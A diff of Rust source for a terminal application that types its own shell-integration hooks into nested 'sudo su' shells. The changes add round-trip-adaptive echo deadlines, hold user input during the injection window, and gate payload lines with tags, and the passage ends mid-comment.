@@ -26,10 +26,22 @@
 //! Delivery is two-phase because a tty echoes bytes when they ARRIVE, not
 //! when the shell reads them: writing the reader line and its payload in one
 //! go would echo the whole base64 wall. So phase 1 types the reader line
-//! (`bootstrap::NESTED_READER`) and waits for its echo to come back and
-//! settle — which proves the remote shell has accepted and is EXECUTING it,
-//! i.e. `stty -echo` has run — and phase 2 then writes the base64 payload
-//! lines invisibly.
+//! (`bootstrap::NESTED_READER`) and waits for its echo to COME BACK and
+//! settle — which proves the remote shell has accepted and is executing it,
+//! so `stty -echo` runs before the payload can arrive — and phase 2 then
+//! writes the tagged base64 payload lines invisibly. Silence alone is never
+//! taken as that proof (it is what a slow link looks like before the echo
+//! arrives), and the deadline that bounds the wait grows with the link
+//! measured on the echo itself (`ECHO_QUIET`, `echo_deadline`).
+//!
+//! Between the reader and its payload the shell is parked in the reader's
+//! `read`s, and whatever reaches it next is what they consume. So every byte
+//! of user input goes through `write_user_input`, and that and every line
+//! Pulse types are serialized on the terminal's PTY writer lock: input in
+//! that window is HELD and written right after the payload, a line submitted
+//! before the reader makes the injection wait for the shell's answer to it,
+//! and the reader itself evaluates nothing unless all four lines carry
+//! Pulse's tags.
 //!
 //! The seam is then made to read as if NOTHING was typed. The reader line is
 //! the only thing a terminal ever echoes, and phase 2 aims an erase payload
@@ -54,6 +66,7 @@
 //! nested world, with the manual notice v0.1.13 already prints.
 
 use super::*;
+use std::io::Write;
 
 /// Output must be quiet this long after the witnessed opener before the
 /// reader line is typed — the same settle rule `reestablish` types under
@@ -65,18 +78,51 @@ const OPEN_QUIET: Duration = Duration::from_millis(700);
 /// never type into a world in an unknown state.
 const OPEN_TIMEOUT: Duration = Duration::from_secs(20);
 
-/// After the reader line is typed, its echo must have come back and been
-/// quiet this long before the payload lines are written. The echo returning
-/// proves the round trip completed and the shell accepted the line, so
-/// `stty -echo` has run and the payload will not be echoed.
+/// After the reader line is typed, its echo must have COME BACK — and the
+/// mirror must show our whole line, exactly where it was typed — and then
+/// been quiet this long before the payload lines are written.
+///
+/// "Came back" is load-bearing and is checked separately (`Phase::AwaitEcho`'s
+/// `rtt`). A journal that has not grown is equally consistent with "the echo
+/// came and settled" and "the reader has not even reached the far end yet",
+/// and on any link slower than this the second one is the truth: v0.1.14-21
+/// fired on silence alone, so at ~600ms RTT the payload left before its
+/// reader had been executed. The mirror could not yet vouch for a line it had
+/// never seen, so the erase declined and the reader stayed on screen; and on a
+/// loaded host the payload landed while `stty -echo` was still being exec'd,
+/// so the base64 hook body printed too (field screenshot `wan600-02`,
+/// rig-reproduced). The echo of our full line is the proof that the shell has
+/// accepted it; the payload then needs one more trip to arrive, by which time
+/// `stty -echo` has long run.
 const ECHO_QUIET: Duration = Duration::from_millis(250);
 
-/// ...and if the echo never settles, the payload is written ANYWAY at this
-/// deadline. The reader line's two `read` builtins block the shell until
-/// they get their two lines: abandoning after phase 1 would leave the user's
-/// shell wedged, so this deadline must always fire. (Worst case the base64
-/// is visible — one ugly screenful, never a broken shell.)
-const ECHO_DEADLINE: Duration = Duration::from_secs(5);
+/// The settle when the echo came back but the mirror does not vouch for our
+/// whole line (a shell that redrew it, a line that scrolled): the shell still
+/// demonstrably received it, so the payload goes out once things have been
+/// quiet for this long or one measured round trip, whichever is longer. The
+/// line will stay visible (the erase gate declines), never the payload.
+const ECHO_QUIET_UNVOUCHED: Duration = Duration::from_secs(1);
+
+/// ...and if no proof ever arrives, the payload is written ANYWAY at the
+/// deadline. The reader line's `read` builtins block the shell until they get
+/// their lines: abandoning after phase 1 would leave the user's shell wedged,
+/// so this deadline must always fire. (Worst case the reader line stays
+/// visible — never a broken shell.)
+///
+/// Adaptive, like completion's (`completion::comp_budget`, the same policy
+/// function): before anything has been measured the deadline is the floor —
+/// exactly the constant it replaces, so nothing gets shorter — and once the
+/// first byte of the echo lands it grows to eight measured round trips,
+/// clamped. A link slower than the floor still gets its echo measured before
+/// the floor fires, because the measurement is the echo's FIRST byte.
+const ECHO_DEADLINE_MIN: Duration = Duration::from_secs(5);
+const ECHO_DEADLINE_MAX: Duration = Duration::from_secs(20);
+
+/// The most user input held back while the shell is parked in our reads
+/// (see `InputRoute::Hold`). Past it — a large paste — the payload goes out
+/// at once and everything held follows it: nothing is ever dropped, and the
+/// worst case is the old one (a visible line), not a wedged hold.
+const HOLD_CAP: usize = 64 * 1024;
 
 /// How long the injected shell has to announce itself with its own `init`
 /// hook before the injection is declared a graceful skip (unknown shell
@@ -89,21 +135,42 @@ const INIT_TIMEOUT: Duration = Duration::from_secs(10);
 pub(super) struct NestHook {
     /// 1 for the first `sudo su`, 2 for a `su - deploy` inside it, …
     depth: usize,
-    /// The three lines to type (reader + two base64 payload lines).
+    /// The lines to type (reader + four tagged payload lines).
     inj: bootstrap::NestedInjection,
     phase: Phase,
     /// The opener that started this episode — logged, never re-typed.
     opener: String,
+    /// User input that arrived while the shell was parked in our `read`s
+    /// (`Phase::AwaitEcho`). It is written right AFTER the payload, under the
+    /// same writer lock, so the reads can only ever consume Pulse's lines and
+    /// the user's bytes reach the shell intact, in order, once the reads are
+    /// satisfied. Never dropped: every exit path delivers it.
+    held: Vec<u8>,
 }
 
 #[derive(Debug, Clone, Copy)]
 enum Phase {
     /// Armed at the witnessed opener; watching for output quiescence before
-    /// the reader line is typed.
-    AwaitQuiet { armed: Instant, last_len: u64, last_change: Instant },
-    /// The reader line was typed; watching its echo settle before the
-    /// payload lines are written (see `ECHO_QUIET`/`ECHO_DEADLINE`).
-    AwaitEcho { sent: Instant, last_len: u64, last_change: Instant },
+    /// the reader line is typed. `answer_from` is the journal length when the
+    /// user last SUBMITTED a line here: until output grows past it the shell
+    /// has not visibly answered that line, so its prompt row on screen is
+    /// stale (see `open_action`'s `answer_pending`).
+    AwaitQuiet {
+        armed: Instant,
+        last_len: u64,
+        last_change: Instant,
+        answer_from: Option<u64>,
+    },
+    /// The reader line was typed; waiting for its echo to come back and
+    /// settle before the payload lines are written (see `ECHO_QUIET`).
+    /// `rtt` is set the first time the journal grows after `sent`: the
+    /// measured round trip, and the proof that the echo was observed.
+    AwaitEcho {
+        sent: Instant,
+        last_len: u64,
+        last_change: Instant,
+        rtt: Option<Duration>,
+    },
     /// The payload was written; waiting for the injected shell's `init`.
     AwaitInit { sent: Instant },
     /// The injected shell announced itself: this nested world is hooked.
@@ -205,6 +272,15 @@ pub(crate) enum OpenAction {
 /// grew, `since_armed` = time since the opener was witnessed. The credential,
 /// alt-screen and prompt-shape checks all run at the SETTLED edge, where the
 /// cursor row is whatever the nested world is waiting at.
+///
+/// `answer_pending`: the user submitted a line here and the shell has not
+/// produced a byte since. On a slow link that is a long time — a whole round
+/// trip — and the screen in the meantime still shows the OLD prompt, quiet
+/// and prompt-shaped. Every settled-edge signal reads "go", and the reader
+/// line was typed into whatever the user had just started: a `cat > notes`
+/// wrote Pulse's reader and its 7KB payload into the user's file, and a
+/// `sudo -v` would have taken them as its password (rig-reproduced at 600ms
+/// RTT). Nothing on the screen is evidence until the shell has answered.
 pub(crate) fn open_action(
     since_armed: Duration,
     quiet_for: Duration,
@@ -212,11 +288,12 @@ pub(crate) fn open_action(
     tail_is_hostkey: bool,
     alt_screen: bool,
     at_prompt: bool,
+    answer_pending: bool,
 ) -> OpenAction {
     if since_armed >= OPEN_TIMEOUT {
         return OpenAction::AbortTimeout;
     }
-    if quiet_for < OPEN_QUIET {
+    if answer_pending || quiet_for < OPEN_QUIET {
         return OpenAction::Wait;
     }
     if alt_screen {
@@ -241,31 +318,276 @@ pub(crate) fn open_action(
 /// `quiet_for = 0` and every settled-edge signal false, which can only answer
 /// Wait or AbortTimeout.
 pub(crate) fn growth_action(since_armed: Duration) -> OpenAction {
-    open_action(since_armed, Duration::ZERO, false, false, false, false)
+    open_action(since_armed, Duration::ZERO, false, false, false, false, false)
+}
+
+/// The phase-2 deadline: the floor until the link has been measured, then
+/// eight measured round trips, clamped (`completion::comp_budget` — one
+/// latency policy for both of Pulse's typed lanes).
+pub(crate) fn echo_deadline(rtt: Option<Duration>) -> Duration {
+    completion::comp_budget(rtt, ECHO_DEADLINE_MIN, ECHO_DEADLINE_MAX)
 }
 
 /// The phase-2 decision (pure): write the payload once the reader's echo has
-/// settled, and ALWAYS by the deadline — a shell parked in `read` must never
-/// be left waiting.
-pub(crate) fn echo_ready(since_sent: Duration, quiet_for: Duration) -> bool {
-    since_sent >= ECHO_DEADLINE || quiet_for >= ECHO_QUIET
+/// demonstrably come back and settled, and ALWAYS by the deadline — a shell
+/// parked in `read` must never be left waiting.
+///
+/// `rtt` is None until the first byte of the echo lands, and silence before
+/// that proves nothing (see `ECHO_QUIET`). `vouched` = the mirror shows our
+/// whole line exactly where it was typed (`erase_start_row` found it), which
+/// is also what lets the erase wipe it.
+pub(crate) fn echo_ready(
+    since_sent: Duration,
+    quiet_for: Duration,
+    rtt: Option<Duration>,
+    vouched: bool,
+) -> bool {
+    if since_sent >= echo_deadline(rtt) {
+        return true;
+    }
+    let Some(rtt) = rtt else {
+        return false;
+    };
+    let settle = if vouched {
+        ECHO_QUIET
+    } else {
+        ECHO_QUIET_UNVOUCHED.max(rtt)
+    };
+    quiet_for >= settle
 }
 
-/// What user input during phase 1 means (pure). The user owns their shell —
-/// the question is only whether their bytes left a LINE BUFFER behind that
-/// ours would concatenate onto.
-///
-/// - A SUBMITTED line (composer `SubmitCommand`, or raw bytes ending in
-///   Enter) leaves no buffer: the shell is running it, its output re-bases
-///   the quiescence clock, and the next settled prompt is still a safe place
-///   to inject. Keep waiting — this is the common field path (`sudo su`
-///   immediately followed by a command), and abandoning it would lose the
-///   integration for the whole episode.
-/// - PARTIAL typing (raw keystrokes with no Enter) leaves a half-typed line
-///   in readline's buffer, and our line would be appended to THEIR command.
-///   Abandon, always: a mangled command line is never an acceptable price.
-pub(crate) fn input_keeps_waiting(submitted: bool) -> bool {
-    submitted
+/// Where an injection is, as far as user input is concerned.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum InputWindow {
+    /// No injection, or one past the reads (payload out, or hooked).
+    Open,
+    /// Phase 1: nothing typed yet.
+    BeforeReader,
+    /// Phase 2: the reader is typed and the payload is not — the shell is
+    /// (or is about to be) parked in our `read`s.
+    InReads,
+}
+
+/// What to do with user input that arrives now (pure).
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum InputRoute {
+    /// Write it now.
+    Deliver,
+    /// Phase 1, a SUBMITTED line (composer `SubmitCommand`, or raw bytes
+    /// ending in Enter): write it, keep the injection, and wait for the
+    /// shell to answer it before trusting the screen again (see
+    /// `open_action`). This is the common field path — `sudo su` and then a
+    /// command straight away — and abandoning would lose the integration for
+    /// the whole episode.
+    DeliverAwaitAnswer,
+    /// Phase 1, PARTIAL typing (no Enter): a half-typed line is in the
+    /// shell's buffer and our reader would be appended to THEIR command.
+    /// Abandon the injection, always, and write the bytes.
+    DeliverAbandon,
+    /// Phase 2: HOLD the bytes and write them right after the payload. Two
+    /// alternatives were wrong. Writing them now puts them between the reader
+    /// and its payload, where the reader's `read`s take them as payload: the
+    /// user's command never runs, the payload shifts by one line, and before
+    /// the tag gate the shifted lines went straight to `eval`. Flushing the
+    /// payload early, ahead of them (v0.1.14-21), keeps the order but writes
+    /// the payload before its echo is proven, so on a slow link it is printed
+    /// on screen (rig-reproduced: the user's command ran, under a wall of
+    /// base64). Held, the payload waits for its proof and the user's bytes
+    /// follow it.
+    Hold,
+    /// Phase 2, but the hold would outgrow `HOLD_CAP`: write the payload now
+    /// (its proof is forfeit — the old flush), then everything held, then
+    /// these bytes.
+    FlushThenDeliver,
+}
+
+/// The input router (pure). `held_after` = how many bytes would be held if
+/// these were added.
+pub(crate) fn input_route(window: InputWindow, submitted: bool, held_after: usize) -> InputRoute {
+    match window {
+        InputWindow::Open => InputRoute::Deliver,
+        InputWindow::BeforeReader if submitted => InputRoute::DeliverAwaitAnswer,
+        InputWindow::BeforeReader => InputRoute::DeliverAbandon,
+        InputWindow::InReads if held_after > HOLD_CAP => InputRoute::FlushThenDeliver,
+        InputWindow::InReads => InputRoute::Hold,
+    }
+}
+
+impl Phase {
+    fn input_window(&self) -> InputWindow {
+        match self {
+            Phase::AwaitQuiet { .. } => InputWindow::BeforeReader,
+            Phase::AwaitEcho { .. } => InputWindow::InReads,
+            Phase::AwaitInit { .. } | Phase::Hooked => InputWindow::Open,
+        }
+    }
+}
+
+/// The injection's state machine, pure — no PTY, no locks, no clock of its
+/// own — so the tests drive exactly what the pump and the input path run, on
+/// a synthetic timeline. The `Core` methods are these plus locking and I/O.
+impl NestHook {
+    fn new(depth: usize, inj: bootstrap::NestedInjection, opener: &str, len: u64, now: Instant) -> Self {
+        NestHook {
+            depth,
+            inj,
+            phase: Phase::AwaitQuiet {
+                armed: now,
+                last_len: len,
+                last_change: now,
+                answer_from: None,
+            },
+            opener: opener.to_string(),
+            held: Vec::new(),
+        }
+    }
+
+    /// User input arrives (the caller holds the terminal's writer). Applies
+    /// the route's effect on this entry and returns it; `DeliverAbandon`
+    /// tells the caller to drop the entry. `len` = the journal length now.
+    fn route_input(&mut self, bytes: &[u8], submitted: bool, len: Option<u64>, now: Instant) -> InputRoute {
+        let route = input_route(self.phase.input_window(), submitted, self.held.len() + bytes.len());
+        match route {
+            InputRoute::DeliverAwaitAnswer => {
+                if let Phase::AwaitQuiet {
+                    last_len,
+                    last_change,
+                    answer_from,
+                    ..
+                } = &mut self.phase
+                {
+                    *answer_from = Some(len.unwrap_or(*last_len));
+                    *last_change = now;
+                }
+            }
+            InputRoute::Hold => self.held.extend_from_slice(bytes),
+            InputRoute::Deliver | InputRoute::DeliverAbandon | InputRoute::FlushThenDeliver => {}
+        }
+        route
+    }
+
+    /// The journal grew to `len`: re-base the quiescence clock for whichever
+    /// phase is watching it. In phase 1 the growth may be the shell ANSWERING
+    /// a line the user submitted (`answer_from`); in phase 2 the first growth
+    /// is the echo coming back — both the proof and the link measurement.
+    fn on_growth(&mut self, len: u64, now: Instant) {
+        match &mut self.phase {
+            Phase::AwaitQuiet {
+                last_len,
+                last_change,
+                answer_from,
+                ..
+            } => {
+                *last_len = len;
+                *last_change = now;
+                if answer_from.is_some_and(|from| len > from) {
+                    *answer_from = None;
+                }
+            }
+            Phase::AwaitEcho {
+                sent,
+                last_len,
+                last_change,
+                rtt,
+            } => {
+                *last_len = len;
+                *last_change = now;
+                if rtt.is_none() {
+                    *rtt = Some(now.duration_since(*sent));
+                }
+            }
+            Phase::AwaitInit { .. } | Phase::Hooked => {}
+        }
+    }
+
+    /// Phase 1 → 2 (the caller holds the writer and types the reader right
+    /// after): only if nothing changed since the pump judged the screen at
+    /// journal length `seen` — no output since (`len`), and no submitted
+    /// line still unanswered. None = do not type.
+    fn begin_reader(&mut self, seen: u64, len: u64, now: Instant) -> Option<String> {
+        match self.phase {
+            Phase::AwaitQuiet {
+                answer_from: None, ..
+            } if len == seen => {
+                self.phase = Phase::AwaitEcho {
+                    sent: now,
+                    last_len: len,
+                    last_change: now,
+                    rtt: None,
+                };
+                Some(self.inj.reader.clone())
+            }
+            _ => None,
+        }
+    }
+
+    /// Phase 2, one pump tick with no growth: Some(why) when the payload
+    /// should go out now. `vouched` is asked only once the echo has been seen
+    /// and has gone quiet — the only moment the mirror's answer can matter.
+    fn echo_due(&self, now: Instant, vouched: impl FnOnce() -> bool) -> Option<&'static str> {
+        let Phase::AwaitEcho {
+            sent,
+            last_change,
+            rtt,
+            ..
+        } = self.phase
+        else {
+            return None;
+        };
+        let quiet_for = now.duration_since(last_change);
+        let vouched = rtt.is_some() && quiet_for >= ECHO_QUIET && vouched();
+        if !echo_ready(now.duration_since(sent), quiet_for, rtt, vouched) {
+            return None;
+        }
+        Some(match (rtt, vouched) {
+            (None, _) => "no echo came back by the deadline",
+            (Some(_), true) => "the reader's echo came back and settled",
+            (Some(_), false) => "the reader's echo came back (the mirror does not vouch for it)",
+        })
+    }
+
+    /// Phase 2, a tick WITH growth: only the absolute deadline may fire —
+    /// a shell parked in our `read` must never be left waiting, however
+    /// loud the output.
+    fn echo_overdue(&self, now: Instant) -> bool {
+        match self.phase {
+            Phase::AwaitEcho { sent, rtt, .. } => {
+                echo_ready(now.duration_since(sent), Duration::ZERO, rtt, false)
+            }
+            _ => false,
+        }
+    }
+
+    /// Phase 2 → 3 (the caller holds the writer and writes, in this order,
+    /// the four payload lines and then the held input): fix the erase row,
+    /// move to `AwaitInit`, and hand both over. None when the payload already
+    /// went out.
+    fn take_payload(&mut self, erase_row: Option<usize>, now: Instant) -> Option<([String; 4], Vec<u8>)> {
+        if !matches!(self.phase, Phase::AwaitEcho { .. }) {
+            return None;
+        }
+        self.inj.erase_row = erase_row;
+        self.phase = Phase::AwaitInit { sent: now };
+        Some((self.inj.payload_lines(), std::mem::take(&mut self.held)))
+    }
+}
+
+/// What became of user input handed to `Core::write_user_input`.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub(crate) enum Delivery {
+    /// Written to the PTY now.
+    Written,
+    /// Held while the shell is parked in a hook injection's reads; written
+    /// right after its payload (or by whatever ends the injection first).
+    Held,
+    /// No live session to write to.
+    NoSession,
+}
+
+/// Write one typed line + Enter to an already-locked PTY writer. False when
+/// any leg failed: a half-written line is worse than none, so callers abandon.
+pub(super) fn write_line(w: &mut (dyn Write + Send), line: &str) -> bool {
+    w.write_all(line.as_bytes()).is_ok() && w.write_all(b"\r").is_ok() && w.flush().is_ok()
 }
 
 /// The erase gate (pure): the 0-based screen row our echoed reader line
@@ -408,58 +730,172 @@ impl Core {
         let now = Instant::now();
         let inj = bootstrap::nested_injection(&token);
         debug_assert!(inj.within_line_limit(), "injected line exceeds the canonical-mode cap");
-        self.nesthooks.lock().insert(
-            id,
-            NestHook {
-                depth,
-                inj,
-                phase: Phase::AwaitQuiet { armed: now, last_len: len, last_change: now },
-                opener: opener.trim().to_string(),
-            },
-        );
+        // A previous entry is superseded; anything it was holding for the
+        // user is delivered first, never dropped.
+        self.remove_nesthook(id, None);
+        self.nesthooks
+            .lock()
+            .insert(id, NestHook::new(depth, inj, opener.trim(), len, now));
         log::info!(
             "terminal {id}: nested hook injection armed (depth {depth}, opener {}) — waiting for the nested prompt to settle",
             opener.trim()
         );
     }
 
-    /// Drop any injection state. Logged only when an entry existed.
+    /// Stop an injection, logged (only when one was in flight).
     pub(super) fn cancel_nesthook(&self, id: Uuid, why: &str) {
-        let entry = self.nesthooks.lock().remove(&id);
-        if let Some(e) = entry {
+        self.remove_nesthook(id, Some(why));
+    }
+
+    /// Drop the injection entry, delivering anything it was holding for the
+    /// user. `why` = Some logs the stop (unless the shell was already hooked:
+    /// a hooked entry retiring with its world is not news); None is silent.
+    ///
+    /// Must never be called with the terminal's PTY writer held. An entry
+    /// holding nothing is removed under the map lock alone; after that, any
+    /// input sees no entry and is written directly, so nothing can be lost.
+    /// One holding bytes is removed UNDER THE WRITER LOCK and its bytes are
+    /// written before the lock is released, so input arriving meanwhile
+    /// queues behind them instead of overtaking them.
+    pub(super) fn remove_nesthook(&self, id: Uuid, why: Option<&str>) {
+        let log_stop = |e: &NestHook| {
+            if let Some(why) = why {
+                if !matches!(e.phase, Phase::Hooked) {
+                    log::info!(
+                        "terminal {id}: nested hook injection stopped at depth {} — {why}",
+                        e.depth
+                    );
+                }
+            }
+        };
+        {
+            let mut map = self.nesthooks.lock();
+            match map.get(&id) {
+                None => return,
+                Some(e) if e.held.is_empty() => {
+                    if let Some(e) = map.remove(&id) {
+                        log_stop(&e);
+                    }
+                    return;
+                }
+                Some(_) => {}
+            }
+        }
+        let writer = self.sessions.lock().get(&id).map(|s| s.writer.clone());
+        let mut guard = writer.as_ref().map(|w| w.lock());
+        let Some(e) = self.nesthooks.lock().remove(&id) else {
+            return;
+        };
+        log_stop(&e);
+        if e.held.is_empty() {
+            return;
+        }
+        let delivered = guard
+            .as_mut()
+            .is_some_and(|w| w.write_all(&e.held).is_ok() && w.flush().is_ok());
+        if delivered {
             log::info!(
-                "terminal {id}: nested hook injection stopped at depth {} — {why}",
-                e.depth
+                "terminal {id}: {} byte(s) of input held during the hook injection delivered",
+                e.held.len()
+            );
+        } else {
+            log::info!(
+                "terminal {id}: {} byte(s) of input held during the hook injection could not be \
+                 delivered — the session is gone",
+                e.held.len()
             );
         }
     }
 
-    /// User input arrived (the same `cancel_reestablish("user input")`
-    /// sites). Phase 1 hands the shell back untouched; phase 2 must NOT
-    /// abandon — the shell is parked in our `read` builtins — so it writes
-    /// the payload immediately and lets the injection finish.
-    pub(super) fn nesthook_on_input(&self, id: Uuid, submitted: bool) {
-        let flush = {
+    /// THE way user (and controller) input reaches a terminal: `C2D::Input`,
+    /// a composer `SubmitCommand` and `ctl send`/`key`/`run` all come through
+    /// here.
+    ///
+    /// Everything that decides where input goes, and everything Pulse types
+    /// on its own, is serialized on the terminal's PTY writer lock. Before,
+    /// the notifications ran first and the write came after, unlocked, while
+    /// the pump typed on its own thread — so between "the injection is not
+    /// typing yet" and the user's write, the pump could type the reader line,
+    /// and the user's line landed between the reader and its payload, where
+    /// the reader's `read`s took it as payload (the H2 shape). The same gap
+    /// let a chain step be typed onto a half-typed line. Under the lock, input
+    /// either lands entirely before Pulse's line (and the injection sees it)
+    /// or entirely after the payload.
+    pub(super) fn write_user_input(
+        &self,
+        id: Uuid,
+        bytes: &[u8],
+        why: &str,
+    ) -> std::io::Result<Delivery> {
+        let submitted = bytes.last().is_some_and(|b| *b == b'\r' || *b == b'\n');
+        // remote-completion: flushes its own payload ahead of these bytes if
+        // a query is parked in `__tc_cq`. It writes, so it runs BEFORE the
+        // writer is taken (the lock is not re-entrant).
+        self.comp_on_input(id);
+        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
+            // No session: the notifications still apply (a dead terminal's
+            // chain must not type into its successor's first line).
+            self.cancel_reestablish(id, why);
+            return Ok(Delivery::NoSession);
+        };
+        let mut w = writer.lock();
+        // F2: the user typing takes the shell back — any in-flight chain
+        // re-establish stops, under the lock its typing takes too.
+        self.cancel_reestablish(id, why);
+        if !self.nesthook_route_locked(id, bytes, submitted, &mut **w) {
+            return Ok(Delivery::Held);
+        }
+        w.write_all(bytes)?;
+        w.flush()?;
+        Ok(Delivery::Written)
+    }
+
+    /// The injection's half of `write_user_input`, called with the writer
+    /// held. Returns whether the caller should write the bytes now.
+    fn nesthook_route_locked(
+        &self,
+        id: Uuid,
+        bytes: &[u8],
+        submitted: bool,
+        w: &mut (dyn Write + Send),
+    ) -> bool {
+        let now = Instant::now();
+        // Read before the map lock (the journal lock is its own leaf): the
+        // length at the moment of a submit is what the answer must exceed.
+        let len = self.journal_len(id);
+        let route = {
             let mut map = self.nesthooks.lock();
-            match map.get(&id).map(|e| e.phase) {
-                Some(Phase::AwaitQuiet { .. }) if input_keeps_waiting(submitted) => {
-                    // A submitted line: its output re-bases the settle clock
-                    // on the next pump tick anyway. Nothing to do.
-                    false
-                }
-                Some(Phase::AwaitQuiet { .. }) => {
+            let Some(e) = map.get_mut(&id) else {
+                return true;
+            };
+            let first_hold = e.held.is_empty();
+            let route = e.route_input(bytes, submitted, len, now);
+            match route {
+                InputRoute::DeliverAbandon => {
                     map.remove(&id);
                     log::info!(
                         "terminal {id}: nested hook injection stopped — the user is typing at the nested prompt"
                     );
-                    false
                 }
-                Some(Phase::AwaitEcho { .. }) => true,
-                _ => false,
+                InputRoute::Hold if first_hold => log::info!(
+                    "terminal {id}: input arrived while the shell is parked in the hook \
+                     injection's reads — held until the payload is out"
+                ),
+                _ => {}
             }
+            route
         };
-        if flush {
-            self.send_nesthook_payload(id);
+        match route {
+            InputRoute::Hold => false,
+            InputRoute::FlushThenDeliver => {
+                self.write_nesthook_payload_locked(
+                    id,
+                    w,
+                    "the input held during the injection outgrew the hold",
+                );
+                true
+            }
+            _ => true,
         }
     }
 
@@ -504,47 +940,86 @@ impl Core {
         }
     }
 
-    /// Write the three base64 payload lines (echo already suppressed by the
-    /// reader line) and move to `AwaitInit`.
+    /// Take the terminal's writer and write the payload (see
+    /// `write_nesthook_payload_locked`).
+    fn send_nesthook_payload(&self, id: Uuid, why: &str) {
+        let Some(writer) = self.sessions.lock().get(&id).map(|s| s.writer.clone()) else {
+            self.cancel_nesthook(id, "session gone before the payload could be written");
+            return;
+        };
+        let ok = {
+            let mut w = writer.lock();
+            self.write_nesthook_payload_locked(id, &mut **w, why)
+        };
+        if !ok {
+            log::warn!(
+                "terminal {id}: the PTY write failed mid-payload — the nested hook injection is abandoned"
+            );
+        }
+    }
+
+    /// Write the four tagged payload lines (echo already suppressed by the
+    /// reader line), then any input held for the user, and move to
+    /// `AwaitInit` — all with the writer held, so nothing can land between
+    /// them. False only when a write failed (the entry is then dropped).
     ///
-    /// The ERASE blob is composed HERE, not at arm time: it targets the row
+    /// The ERASE row is composed HERE, not at arm time: it targets the row
     /// the echoed reader line starts on, and that row can only be read off the
     /// mirror once the echo has actually landed — after any wrapping and any
     /// scrolling the terminal itself decided on.
-    fn send_nesthook_payload(&self, id: Uuid) {
-        let reader = {
+    fn write_nesthook_payload_locked(
+        &self,
+        id: Uuid,
+        w: &mut (dyn Write + Send),
+        why: &str,
+    ) -> bool {
+        let (reader, rtt) = {
             let map = self.nesthooks.lock();
-            let Some(e) = map.get(&id) else { return };
-            if !matches!(e.phase, Phase::AwaitEcho { .. }) {
-                return;
+            match map.get(&id) {
+                Some(NestHook {
+                    inj,
+                    phase: Phase::AwaitEcho { rtt, .. },
+                    ..
+                }) => (inj.reader.clone(), *rtt),
+                // Already written (the pump and a held-input overflow can
+                // race to here; the writer lock makes the second a no-op).
+                _ => return true,
             }
-            e.inj.reader.clone()
         };
         let erase_row = self.nesthook_erase_row(id, &reader);
+        let taken = self
+            .nesthooks
+            .lock()
+            .get_mut(&id)
+            .and_then(|e| e.take_payload(erase_row, Instant::now()));
+        let Some((lines, held)) = taken else {
+            return true;
+        };
+        log::info!(
+            "terminal {id}: nested hook payload written — {why} (link {})",
+            match rtt {
+                Some(r) => format!("{}ms measured", r.as_millis()),
+                None => "unmeasured".to_string(),
+            }
+        );
         if erase_row.is_none() {
             log::info!(
                 "terminal {id}: the injected line stays visible — the mirror does not show it \
                  exactly where it was typed (wrapped off-screen, or the shell redrew)"
             );
         }
-        let lines = {
-            let mut map = self.nesthooks.lock();
-            let Some(e) = map.get_mut(&id) else { return };
-            if !matches!(e.phase, Phase::AwaitEcho { .. }) {
-                return;
-            }
-            e.inj.erase_b64 = bootstrap::nested_erase_payload(erase_row);
-            e.inj.payload_lines().map(str::to_string)
-        };
-        for l in &lines {
-            if !self.type_reestablish_line(id, l) {
-                self.cancel_nesthook(id, "session gone before the payload could be written");
-                return;
-            }
+        let mut ok = lines.iter().all(|l| write_line(w, l));
+        if ok && !held.is_empty() {
+            ok = w.write_all(&held).is_ok() && w.flush().is_ok();
+            log::info!(
+                "terminal {id}: {} byte(s) of input held during the hook injection delivered after the payload",
+                held.len()
+            );
         }
-        if let Some(e) = self.nesthooks.lock().get_mut(&id) {
-            e.phase = Phase::AwaitInit { sent: Instant::now() };
+        if !ok {
+            self.nesthooks.lock().remove(&id);
         }
+        ok
     }
 
     /// The injection engine, riding the 250ms flush tick beside
@@ -574,7 +1049,12 @@ impl Core {
                 continue;
             }
             match phase {
-                Phase::AwaitQuiet { armed, last_len, last_change } => {
+                Phase::AwaitQuiet {
+                    armed,
+                    last_len,
+                    last_change,
+                    answer_from,
+                } => {
                     let len = self.journal_len(id).unwrap_or(last_len);
                     if len != last_len {
                         // ABSOLUTE DEADLINE FIRST. Re-basing the quiescence
@@ -622,6 +1102,7 @@ impl Core {
                         hostkey,
                         alt,
                         at_prompt,
+                        answer_from.is_some(),
                     ) {
                         OpenAction::Wait | OpenAction::WaitForPrompt => {}
                         OpenAction::AbortCredential => self.cancel_nesthook(
@@ -640,25 +1121,38 @@ impl Core {
                             id,
                             "the nested shell never settled at a shell prompt",
                         ),
-                        OpenAction::Send => self.send_nesthook_reader(id, now),
+                        OpenAction::Send => self.send_nesthook_reader(id, len),
                     }
                 }
-                Phase::AwaitEcho { sent, last_len, last_change } => {
+                Phase::AwaitEcho { last_len, .. } => {
                     let len = self.journal_len(id).unwrap_or(last_len);
                     if len != last_len {
                         // ABSOLUTE DEADLINE FIRST — same defect, same shape:
-                        // `echo_ready`'s ECHO_DEADLINE arm is documented to
-                        // "fire even while output is still streaming", and
-                        // the `continue` was the reason it never did. A shell
+                        // `echo_ready`'s deadline arm is documented to "fire
+                        // even while output is still streaming", and the
+                        // `continue` was the reason it never did. A shell
                         // parked in our `read` must never be left waiting.
+                        // The first growth is also the link measurement.
                         self.rebase_nesthook(id, len, now);
-                        if echo_ready(now.duration_since(sent), Duration::ZERO) {
-                            self.send_nesthook_payload(id);
+                        let overdue = self
+                            .nesthooks
+                            .lock()
+                            .get(&id)
+                            .is_some_and(|e| e.echo_overdue(now));
+                        if overdue {
+                            self.send_nesthook_payload(id, "the echo never settled by the deadline");
                         }
                         continue;
                     }
-                    if echo_ready(now.duration_since(sent), now.duration_since(last_change)) {
-                        self.send_nesthook_payload(id);
+                    // A snapshot, so the mirror can be asked with no
+                    // injection lock held (it takes the sessions and term
+                    // locks).
+                    let Some(e) = self.nesthooks.lock().get(&id).cloned() else {
+                        continue;
+                    };
+                    let due = e.echo_due(now, || self.nesthook_erase_row(id, &e.inj.reader).is_some());
+                    if let Some(why) = due {
+                        self.send_nesthook_payload(id, why);
                     }
                 }
                 Phase::AwaitInit { sent } => {
@@ -769,38 +1263,52 @@ impl Core {
     }
 
     /// Output grew: re-base the quiescence clock for whichever phase is
-    /// watching it.
+    /// watching it. In phase 1 the growth may be the shell ANSWERING a line
